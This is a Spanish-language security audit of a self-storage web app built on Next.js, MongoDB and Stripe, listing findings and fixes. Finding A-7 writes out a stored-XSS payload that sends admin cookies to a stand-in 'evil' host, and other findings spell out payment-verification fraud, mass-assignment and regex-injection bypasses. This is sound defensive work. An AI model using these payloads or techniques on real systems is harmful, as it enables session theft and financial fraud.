# Informe de Auditoría de Seguridad — Tuscany Self-Storage

**Aplicación:** Next.js + MongoDB + NextAuth + Stripe (producción en Vercel)
**Fecha:** 2026-06-10
**Método:** Auditoría estática multi-agente (38 agentes) con verificación adversarial de cada hallazgo
**Audiencia:** Desarrollador / operador

---

## 1. Resumen ejecutivo

La aplicación tiene una base de seguridad razonable (autorización a nivel de objeto en las rutas de inquilino, verificación de firma en el webhook de Stripe, `bcrypt` para contraseñas, cabeceras de seguridad ya configuradas), pero presenta **varios fallos graves explotables sin mitigación** concentrados en dos áreas críticas: la **verificación de pagos de Stripe** (varios endpoints confían en el importe enviado por el cliente y nunca lo comparan contra lo realmente cobrado) y el **control de acceso/autorización** (un inquilino puede auto-asignarse campos financieros privilegiados; un admin degradado conserva el acceso hasta 30 días). Hay además un XSS almacenado que alcanza el panel de administración a través de campos del formulario público de reserva.

**Conteo por severidad (ajustada por verificación):**

| Severidad | Cantidad |
|-----------|----------|
| Crítico   | 0 |
| Alto      | 7 |
| Medio     | 6 |
| Bajo      | 12 |
| Informativo | 1 |
| **Total** | **26** |

> **Contexto ya resuelto:** la fuga de PII de inquilino reportada previamente ya fue corregida y desplegada. Este informe no la cuenta entre los hallazgos abiertos.

**Prioridad inmediata:** los tres fallos de verificación de pagos (move-in / pay-multi) permiten pérdida financiera directa y deben corregirse antes que nada.

---

## 2. Hallazgos confirmados

### 🔴 ALTO

#### A-1. Pagos: `pay-multi` confía en el importe enviado por el cliente — el saldo puede saldarse pagando $1

- **Dónde:** `app/api/portal/pay-multi/route.ts:65-200` (especialmente 98-122, 147-197); `app/api/portal/pay-multi/intent/route.ts:112`
- **Qué es:** El endpoint acepta `amount` (céntimos) y `paymentIntentId` del inquilino autenticado. La única validación del pago es `intent.status === 'succeeded'`. **Nunca** compara `intent.amount_received` con el `amount` recibido, **nunca** verifica que `intent.customer === tenant.stripeCustomerId`, y **nunca** marca el intent como consumido. Luego salda cargos del más antiguo al más nuevo hasta `amount` y reduce `tenant.balance` por el valor enviado por el cliente.
- **Explotación:** El inquilino crea un PaymentIntent de $1.00 vía `/pay-multi/intent`, lo confirma (paga $1), y luego llama a `/pay-multi` con ese `paymentIntentId` y `amount` = su saldo completo en céntimos. El servidor ve `succeeded` y marca todo el saldo pagado. Al no haber deduplicación del `paymentIntentId` (índice no único en `models/Payment.ts:111`), un único intent `succeeded` puede reutilizarse indefinidamente.
- **Corrección:**
  - Acreditar **exclusivamente** desde `intent.amount_received`, nunca desde el cuerpo de la petición.
  - Verificar `intent.customer === tenant.stripeCustomerId` y `intent.metadata.tenantId === session.user.id`.
  - Añadir índice único en `stripePaymentIntentId` y rechazar cualquier intent ya registrado (uso único).

#### A-2. Pagos: `reserve/finalize` no vincula el PaymentIntent al lease ni verifica su importe

- **Dónde:** `app/api/public/reserve/finalize/route.ts:57-93, 239-299`
- **Qué es:** Endpoint **sin autenticación**. Toma `leaseId` y `paymentIntentId` del cuerpo, acepta el intent solo por `status === 'succeeded'`. No comprueba que `intent.metadata.leaseId === leaseId`, ni que el cliente del intent corresponda al inquilino del lease, ni que `intent.amount` cubra el total recalculado (`breakdown.dueToday.total`). Firma el lease, marca la unidad ocupada, crea cargos/pagos como `succeeded` y pone `tenant.balance` a 0.
- **Explotación:** El atacante reserva una unidad cara (lease A) y obtiene cualquier intent `succeeded` barato (Stripe permite mínimo 50¢). Envía finalize con `leaseId=A` y el intent de 50¢: el lease A se firma, la unidad se ocupa y todo el move-in queda registrado como pagado. Sin índice único, un mismo intent barato puede finalizar muchos leases.
- **Corrección:** Exigir `intent.metadata.leaseId === leaseId` y `intent.customer === tenant.stripeCustomerId`; afirmar `intent.amount_received >= breakdown.dueToday.total`; rechazar intents reutilizados (índice único).

#### A-3. Pagos: `reserve/confirm` registra pagos como `succeeded` sin verificar importe ni propiedad

- **Dónde:** `app/api/public/reserve/confirm/route.ts:31-89`
- **Qué es:** Mismo defecto que finalize, también **sin autenticación**. Exige solo `status === 'succeeded'`, y crea incondicionalmente dos filas `Payment` con `status: 'succeeded'` por `unit.price` cada una (depósito + primer mes). No verifica que el importe cubra 2× `unit.price` ni que el intent pertenezca al lease/inquilino.
- **Explotación:** Enviar cualquier intent `succeeded` barato con un `leaseId` objetivo; el servidor registra depósito + renta completos como pagados.
- **Corrección:** Igual que A-2: verificar `metadata.leaseId`, `customer` y `amount_received` contra el total esperado; uso único del intent.

#### A-4. Authz: el auto-PATCH del inquilino permite asignación masiva de campos financieros/privilegiados

- **Dónde:** `app/api/tenants/[id]/route.ts:103-156` (bloque de filtrado 124-130)
- **Qué es:** El PATCH aplica correctamente la propiedad (línea 113), pero el filtrado por rol es una **lista negra incompleta**: para no-admins solo borra `role`, `status`, `stripeCustomerId` y `defaultPaymentMethodId`. El esquema Zod sigue aceptando y persistiendo campos privilegiados: `lateFeeExempt`, `taxExempt`, `lateLienNotificationsDisabled`, `gateCode`, `autopayEnabled`, `archived`, etc. Llegan directos a `Tenant.findByIdAndUpdate`.
- **Explotación:** Un inquilino hace `PATCH /api/tenants/<suPropioId>` con `{"lateFeeExempt":true,"taxExempt":true,"lateLienNotificationsDisabled":true}`. La lista negra no elimina esas claves y se guardan: queda exento de mora e impuestos y suprime notificaciones de morosidad/gravamen. También puede fijar `gateCode` arbitrario.
- **Corrección:** Sustituir la lista negra por una **lista blanca** para no-admins: esquema Zod separado y estricto con solo campos auto-editables (`firstName`, `lastName`, `phone`, dirección, contacto alternativo, `smsConsent`).

#### A-5. Authn: un admin degradado conserva acceso de admin hasta que expire el JWT (hasta 30 días)

- **Dónde:** `lib/auth.ts:135-160` (callbacks jwt/session); `middleware.ts:10-14`
- **Qué es:** El callback `jwt` solo fija `token.role` en el login inicial (credenciales); solo re-consulta el rol en la BD para proveedores sociales. En cada petición posterior se confía en el rol del token firmado. Sin `maxAge`, NextAuth usa el default de 30 días. Un admin degradado a `tenant` conserva un JWT de admin válido hasta que expire, sin revocación.
- **Explotación:** Tras despedir/comprometer un admin, ops fija `role='tenant'`. La sesión existente sigue accediendo a `/api/admin` hasta 30 días. La única forma de cerrarla es rotar `NEXTAUTH_SECRET` (que cierra la sesión de todos).
- **Corrección:** Re-consultar `role` (+ `loginDisabled`/versión de token) desde la BD en el callback `jwt` para todos los proveedores; o `maxAge` corto (1-8 h); o adaptador de sesión en BD con versión de token.

#### A-6. Pagos/Config: el endpoint cron falla abierto cuando `CRON_SECRET` no está configurado

- **Dónde:** `app/api/cron/route.ts:75-79`
- **Qué es:** `isAuthorized()` devuelve `true` si `CRON_SECRET` no está configurado ("modo dev"). Los handlers ejecutan trabajos destructivos: bloqueos por morosidad + recargos, cargos a tarjetas de autopay, ejecución de tarifas, facturas. `CRON_SECRET` no está en `.env.local`, así que la defensa depende de que la variable esté fijada en producción.
- **Explotación:** Si `CRON_SECRET` se borra en producción, un atacante hace `POST /api/cron?job=delinquency` (o autopay) para cobrar tarjetas, aplicar recargos y disparar bloqueos de puerta. El `GET` sin `?job` enumera todos los trabajos internos sin auth.
- **Corrección:** Fallar cerrado: `if (!secret) return false`. Mover el bypass de dev tras `NODE_ENV !== 'production'`. Proteger también el `GET`. Añadir `CRON_SECRET` a `.env.example`.

#### A-7. Inyección: XSS almacenado — placeholders del usuario inyectados sin escape en HTML con `dangerouslySetInnerHTML`

- **Dónde:** `lib/templatePlaceholders.ts:6`; `lib/sendNotification.ts:64-120`; `app/api/public/agreement/[leaseId]/route.ts:105-111`; `app/admin/tenants/[id]/move-out-receipt/page.tsx:201`; esquema en `app/api/public/reserve/route.ts:19-21`
- **Qué es:** Campos del inquilino (`firstName`, `address`, etc.) se fusionan en HTML por sustitución de cadenas **sin escape** y ese HTML se renderiza con `dangerouslySetInnerHTML`. El Zod de reserva solo exige `z.string().min(1)`.
- **Explotación:** Un prospecto envía la reserva pública (sin auth) con `firstName` = `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`. Cuando un empleado abre el Move-Out Receipt de ese inquilino, el payload se ejecuta en la sesión autenticada del admin. React no ejecuta `<script>` pero **sí** ejecuta `onerror`/`onload`.
- **Corrección:** Escapar HTML (`&`, `<`, `>`, `"`, `'`) en cada valor de placeholder antes de la sustitución, o sanitizar con DOMPurify/sanitize-html en el servidor. Solo los valores fusionados necesitan escape, no el marcado de plantilla de confianza.

### 🟠 MEDIO

#### M-1. Exposición de datos: endpoint de acuerdo sin autenticación filtra PII del inquilino vía `leaseId` (IDOR)

- **Dónde:** `app/api/public/agreement/[leaseId]/route.ts:59-119`
- **Qué es:** Sin autenticación. Carga el `Lease` + `Tenant` completo y renderiza la plantilla con tokens de PII (`CUSTOMER_NAME/EMAIL/PHONE/ADDRESS`, `ALTERNATE_*`, `GATE_CODE`). El único control es conocer el ObjectId del lease (no secreto: viaja en URLs de reserva/firma).
- **Corrección:** Exigir token firmado/con expiración (o sesión) para ver un acuerdo. Excluir gate code/PII de contacto alternativo del render público pre-firma.

#### M-2. Inyección: inyección de regex en búsqueda de promo code — bypass del código

- **Dónde:** `app/api/public/calculate-charges/route.ts:52-54`; `reserve/finalize/route.ts:101-103`; `reserve/update-amount/route.ts:52-54`
- **Qué es:** Tres endpoints públicos construyen `$regex` con el `promoCode` del usuario sin escapar metacaracteres. `validate-code` sí escapa correctamente.
- **Explotación:** `promoCode: ".*"` → `^.*$` coincide con la primera promoción activa sin importar el código real, aplicando un descuento no concedido. Además alcanzan promociones automáticas (no filtran `method:'promo_code'`).
- **Corrección:** Escapar metacaracteres (reusar el escape de validate-code) o igualdad exacta con collation. Los tres handlers.

#### M-3. Pagos/Config: fallback "fail-open" desactiva la auth de webhooks/cron cuando falta la variable

- **Dónde:** `webhooks/twilio/sms/route.ts:40-44`; `twilio/status:29-33`; `pdk:60-63`; `resend:30-34`; `cron:75-79`; `cron/recurring-billing:43-51`
- **Qué es:** Todos los webhooks no-Stripe y ambos crons tratan un secreto ausente como "aceptar sin verificación". El SMS de Twilio es el más sensible: dispara la apertura física de la puerta (`handleTextToOpen`).
- **Corrección:** Fallar cerrado en producción (secreto ausente → 401/500). Bypass solo bajo guarda dev explícita.

#### M-4. Authn: rate limiting de login solo por email y en memoria por instancia

- **Dónde:** `lib/auth.ts:11-24, 48-60`
- **Qué es:** Limiter solo por email, estado en `Map` por proceso. Sin límite por IP → spraying sobre muchos emails; en serverless cada instancia tiene su contador; el contador se consume antes de comprobar contraseña → DoS dirigido (bloquear el email de una víctima con 5 intentos).
- **Corrección:** Límite por IP+email respaldado por almacén compartido (Redis/Upstash/Mongo), contando solo fallos; backoff exponencial.

#### M-5. Authn: `loginDisabled` nunca se aplica en el login

- **Dónde:** `lib/auth.ts:43-68`
- **Qué es:** El modelo tiene `loginDisabled` (`models/Tenant.ts:149`) pero `authorize` nunca lo lee. Cualquier cuenta deshabilitada puede iniciar sesión. (forgot-password sí está protegido contra auto-rehabilitación.)
- **Corrección:** `if (tenant.loginDisabled) return null` en `authorize()`.

#### M-6. Config: reserve y upload-id sin rate limiting ni anti-bot

- **Dónde:** `public/reserve/route.ts:58`; `reserve/finalize:42`; `reserve-hold:42`; `upload-id:6`
- **Qué es:** El flujo de reserva no llama a `rateLimit()` ni Turnstile (a diferencia de forgot-password/waiting-list). Vectores sin límite: `upload-id` (subidas ≤10 MB a R2, abuso de coste) y `reserve-hold` (creación de PaymentIntents en Stripe). Enumeración de emails en `reserve:86-89`.
- **Corrección:** `lib/rateLimit` por IP en todos los mutadores de `/api/public`; Turnstile en reserve/upload-id; respuesta no enumerante para emails duplicados.

### 🟡 BAJO

- **B-1.** `GET /api/promotions` expone documentos completos de promoción (incl. `promoCode`) a cualquier inquilino autenticado — falta el check `role==='admin'`. (`app/api/promotions/route.ts:42-57`)
- **B-2.** Documento `Tenant` completo (`securityAnswer` en texto plano, SSN, gate code, ids de Stripe) serializado al cliente en `GET /api/leases/[id]` y `/api/tenants/[id]`. La authz existe, pero sobre-expone. Añadir `.select()` y `select:false`.
- **B-3.** Errores internos de Mongoose/Mongo reflejados al cliente (`error.message` crudo), alcanzable sin auth vía CastError en `/api/public/reserve`. Mensajes genéricos + logging server-side.
- **B-4.** Recuperación no autenticada del `clientSecret` de PaymentIntent basada solo en `leaseId` (`reserve/update-amount:117-203`). Impacto menor. Atar a token de propiedad.
- **B-5.** Inyección de HTML en el email al admin vía formulario de contacto sin escape (`contact/route.ts:66-77`). Phishing, no ejecución.
- **B-6.** `upload-id` sin auth/rate limiting/anti-bot (valida tipo/tamaño OK). Abuso de coste R2.
- **B-7.** `CRON_SECRET` comparado con `===` no constante y aceptado por query string (`?secret=` queda en logs). Solo cabecera + `crypto.timingSafeEqual`.
- **B-8.** Turnstile recae en el secreto de test "always-pass" si la variable está ausente. Fallar cerrado en producción.
- **B-9.** Enumeración de usuarios por canal lateral de tiempo en login (sin hash dummy para cuentas inexistentes).
- **B-10.** Contraseña admin por defecto `admin123` en `scripts/create-admin.ts:23` y `.env.example:37`. Eliminar el default.
- **B-11.** Ausencia de Content-Security-Policy (las demás cabeceras sí están). Defensa en profundidad frente a A-7.
- **B-12.** TTL del token de reset de contraseña de 7 días. Reducir a ~30-60 min.

### ⚪ INFORMATIVO

- **I-1.** Vida de sesión y cookies dependen de defaults de NextAuth (maxAge 30 días, sin `useSecureCookies`). Fijar `session.maxAge` (8-24 h) y `useSecureCookies: true`.

---

## 3. Lo que está bien (no preocuparse)

- Autorización a nivel de objeto en rutas de inquilino/lease — no hay fuga entre inquilinos.
- Webhook de Stripe: verificación de firma correcta.
- HMAC sólido en webhooks/crons cuando los secretos están configurados.
- `validate-code` escapa correctamente los metacaracteres de regex.
- POST/PUT/DELETE de promociones protegidos tras `role==='admin'`.
- Contraseñas: `bcrypt` + `select:false` en `password`.
- Subida de SVG de admin: solo admin, servida desde origen aislado de R2.
- OAuth (Google/Facebook/Apple): verifican propiedad del email.
- Secretos: `.env.local` gitignored; producción no versionada; Stripe local en test.
- Cabeceras: HSTS, nosniff, X-Frame-Options=DENY, Referrer-Policy, Permissions-Policy ya configuradas. Falta solo CSP.
- Anti-bot ya cableado en forgot-password y waiting-list.
- Idempotencia por periodo en el cron de recurring-billing.
- forgot-password rechaza emitir token para cuentas con `loginDisabled`.
- Fuga de PII de inquilino previa: ya corregida y desplegada.

---

## 4. Recomendaciones priorizadas

1. **Verificación de pagos Stripe (A-1, A-2, A-3) — máxima prioridad.** Acreditar solo desde `intent.amount_received`; verificar `customer`/`metadata`; índice único en `stripePaymentIntentId` + uso único.
2. **Fallar cerrado en cron y webhooks (A-6, M-3).** Secreto ausente en producción → 401/500. Proteger el `GET` de cron. Eliminar `?secret=` (B-7).
3. **Lista blanca en el PATCH de inquilino (A-4).** Esquema Zod estricto para no-admins.
4. **Re-validar rol/estado desde la BD en el callback `jwt` (A-5)** o `maxAge` corto + versión de token. Aplicar `loginDisabled` (M-5).
5. **Escapar placeholders antes del render HTML (A-7)** + CSP (B-11).
6. **Token de propiedad por-lease (M-1, B-4).** Excluir gate code/PII del render público pre-firma.
7. **Escapar regex de promo-code (M-2)** en los tres handlers.
8. **Rate limiting (M-4, M-6, B-6).** `lib/rateLimit` por IP en login, reserve, upload-id; Turnstile en reserve/upload-id.
9. **Reducir blast radius (B-2, B-3).** `.select()`; `select:false` en `securityAnswer`/`ssn`/`driversLicense`; errores 5xx genéricos.
10. **Higiene de config (B-8, B-10, B-12, I-1).** Fallar cerrado en Turnstile; eliminar `admin123`; TTL de reset ~1 h; `session.maxAge` + `useSecureCookies`.
11. **Endurecer accesos menores (B-1, B-5, B-9).** Proteger `GET /api/promotions`; escapar HTML del email de contacto; hash bcrypt dummy en login.

---

*No hay hallazgos de severidad Crítica, pero los 7 hallazgos Altos —en especial el trío de verificación de pagos— deben tratarse como bloqueantes de producción.*
